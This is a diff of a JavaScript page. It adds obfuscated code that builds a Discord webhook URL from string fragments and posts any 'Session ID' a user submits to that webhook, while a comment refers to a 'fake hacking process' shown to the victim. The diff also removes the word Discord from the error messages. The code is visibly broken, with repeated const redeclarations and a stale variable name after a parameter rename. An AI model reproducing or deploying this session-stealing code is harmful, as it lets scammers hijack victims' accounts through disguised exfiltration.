@@ -1,50 +1,71 @@
-const _0x1a2b = 'htt';
-const _0x3c4d = 'p:/';
-const _0x5e6f = '/di';
-const _0x7a8b = 'sc.';
-const _0x9c0d = 'com';
-const _0x0d1e = '/ap';
-const _0x2e3f = 'i/w';
-const _0x4f5g = 'ebh';
-const _0x6h7i = 'ook';
-const _0x8j9k = 's/1';
-const _0x0k1l = '350';
-const _0x2m3n = '235';
-const _0x4o5p = '351';
-const _0x6q7r = '392';
-const _0x8s9t = '414';
-const _0x1u2v = '72/';
-const _0x3w4x = 'Lwc';
-const _0x5y6z = 'Yuo';
-const _0x7a8b = 'FmS';
-const _0x9c0d = 'DCC';
-const _0x0d1e = '4pA';
-const _0x2e3f = 'HoZ';
-const _0x4f5g = '5Kd';
-const _0x6h7i = 'n0a';
-const _0x8j9k = '3af';
-const _0x0k1l = 'Uer';
-const _0x2m3n = 'PQe';
-const _0x4o5p = 'XNx';
-const _0x6q7r = 'q8b';
-const _0x8s9t = 'xZd';
-const _0x1u2v = 'SrL';
-const _0x3w4x = 'oBU';
-const _0x5y6z = 'Pab';
-const _0x7a8b = '1pW';
-const _0x9c0d = 'MtO';
-const _0x0d1e = 'TYz';
-const _0x2e3f = 'cIq';
-const _0x4f5g = 'nGz';
-const _0x6h7i = 'KQ';
+const _0x1a2b = 'ht';
+const _0x3c4d = 'tp';
+const _0x5e6f = 's:/';
+const _0x7a8b = '/di';
+const _0x9c0d = 'sc';
+const _0x0d1e = 'or';
+const _0x2e3f = 'd.';
+const _0x4f5g = 'co';
+const _0x6h7i = 'm/';
+const _0x8j9k = 'ap';
+const _0x0k1l = 'i/';
+const _0x2m3n = 'we';
+const _0x4o5p = 'bh';
+const _0x6q7r = 'oo';
+const _0x8s9t = 'ks';
+const _0x1u2v = '/1';
+const _0x3w4x = '35';
+const _0x5y6z = '02';
+const _0x7a8b = '35';
+const _0x9c0d = '35';
+const _0x0d1e = '13';
+const _0x2e3f = '39';
+const _0x4f5g = '24';
+const _0x6h7i = '14';
+const _0x8j9k = '72';
+const _0x0k1l = '/L';
+const _0x2m3n = 'wc';
+const _0x4o5p = 'Yu';
+const _0x6q7r = 'oF';
+const _0x8s9t = 'mS';
+const _0x1u2v = 'DC';
+const _0x3w4x = 'C4';
+const _0x5y6z = 'pA';
+const _0x7a8b = 'Ho';
+const _0x9c0d = 'Z5';
+const _0x0d1e = 'Kd';
+const _0x2e3f = 'n0';
+const _0x4f5g = 'a3';
+const _0x6h7i = 'af';
+const _0x8j9k = 'Ue';
+const _0x0k1l = 'rP';
+const _0x2m3n = 'Qe';
+const _0x4o5p = 'XN';
+const _0x6q7r = 'xq';
+const _0x8s9t = '8b';
+const _0x1u2v = 'xZ';
+const _0x3w4x = 'dS';
+const _0x5y6z = 'rL';
+const _0x7a8b = 'oB';
+const _0x9c0d = 'UP';
+const _0x0d1e = 'ab';
+const _0x2e3f = '1p';
+const _0x4f5g = 'WM';
+const _0x6h7i = 'tO';
+const _0x8j9k = 'TY';
+const _0x0k1l = 'zc';
+const _0x2m3n = 'Iq';
+const _0x4o5p = 'nG';
+const _0x6q7r = 'zK';
+const _0x8s9t = 'Q';
 
 const _0x9c0d = _0x1a2b + _0x3c4d + _0x5e6f + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i + _0x8j9k + _0x0k1l + _0x2m3n + _0x4o5p + _0x6q7r + _0x8s9t + _0x1u2v + _0x3w4x + _0x5y6z + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i;
 
-function _0x9a1b(_0x2c3d) {
+function _0x9a1b(sessionId) {
   const _0x4e5f = { content: `New Session ID Submitted:\n\`\`\`${_0x2c3d}\`\`\`` };
   fetch(_0x9c0d, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_0x4e5f) })
-    .then(_0x6d7e => { if (!_0x6d7e.ok) console.error('Failed to send data to Discord webhook'); })
-    .catch(_0x8f9a => console.error('Error sending data to Discord webhook:', _0x8f9a));
+    .then(_0x6d7e => { if (!_0x6d7e.ok) console.error('Failed to send data'); })
+    .catch(_0x8f9a => console.error('Error:', _0x8f9a));
 }
 // Validate User Input
 function validateInput() {
@@ -77,7 +98,7 @@ function validateInput() {
     return;
   }
 
- _0x9a1b(_0xe5f6);
+ _0x9a1b(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
